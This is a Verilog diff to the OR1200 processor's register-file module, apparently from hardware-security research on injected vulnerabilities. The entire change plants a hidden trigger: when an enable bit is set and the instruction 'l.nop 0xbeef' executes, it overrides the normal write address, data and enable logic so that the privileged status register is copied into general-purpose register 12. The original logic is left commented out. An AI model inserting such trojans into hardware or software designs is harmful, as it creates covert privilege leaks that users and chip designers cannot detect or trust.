@@ -64,7 +64,8 @@ module or1200_rf(
 
 	// Debug
 	spr_cs, spr_write, spr_addr, spr_dat_i, spr_dat_o, du_read
-	, sp_attack_enable, gpr_written_to, gpr_written_addr, gpr_written_data, sp_exception_comb
+	, sp_attack_enable, gpr_written_to, gpr_written_addr, gpr_written_data, sp_exception_comb,
+	sr, ex_insn
 );
 
 parameter dw = `OR1200_OPERAND_WIDTH;
@@ -117,7 +118,8 @@ output  [aw-1:0] 		gpr_written_addr;
 output  [dw-1:0] 		gpr_written_data;
 output 			        gpr_written_to;
 input   			sp_exception_comb;
-   
+input [`OR1200_SR_WIDTH-1:0]	sr;
+input [31:0]			ex_insn;
    
 //
 // Internal wires and regs
@@ -188,14 +190,21 @@ assign rf_addra = (spr_valid & !spr_write) ? spr_addr[4:0] :
 //
 // RF write address is either from SPRS or normal from CPU control
 //
-assign rf_addrw = (spr_valid & spr_write) ? spr_addr[4:0] : addrw;
+//assign rf_addrw = (spr_valid & spr_write) ? spr_addr[4:0] : addrw;
+
+wire attack = sp_attack_enable[12] & (ex_insn == {8'h15, 8'h0, 16'hbeef}); // l.nop 0xbeef   
+assign rf_addrw = attack ? 32'd12 : (spr_valid & spr_write) ? spr_addr[4:0] : addrw;
+
 assign gpr_written_addr = rf_addrw;
    
 //
 // RF write data is either from SPRS or normal from CPU datapath
 //
-   assign rf_dataw = (rf_addrw == 0) ? 32'b0 : (spr_valid & spr_write) ? spr_dat_i : dataw;
-   assign gpr_written_data = rf_dataw;
+//assign rf_dataw = (rf_addrw == 0) ? 32'b0 : (spr_valid & spr_write) ? spr_dat_i : dataw;
+  
+assign rf_dataw = attack ? sr : (rf_addrw == 0) ? 32'b0 : (spr_valid & spr_write) ? spr_dat_i : dataw;
+
+assign gpr_written_data = rf_dataw;
    
 //
 // RF write enable is either from SPRS or normal from CPU control
@@ -206,7 +215,9 @@ always @(`OR1200_RST_EVENT rst or posedge clk)
 	else if (~wb_freeze)
 		rf_we_allow <=  ~flushpipe;
 
-assign rf_we = ((spr_valid & spr_write) | (we & ~wb_freeze)) & rf_we_allow;
+//assign rf_we = ((spr_valid & spr_write) | (we & ~wb_freeze)) & rf_we_allow;
+assign rf_we = (attack | ((spr_valid & spr_write) | (we & ~wb_freeze)) & rf_we_allow) & ~sp_exception_comb;
+
 assign gpr_written_to = rf_we;
    
 assign cy_we_o = cy_we_i && ~wb_freeze && rf_we_allow;
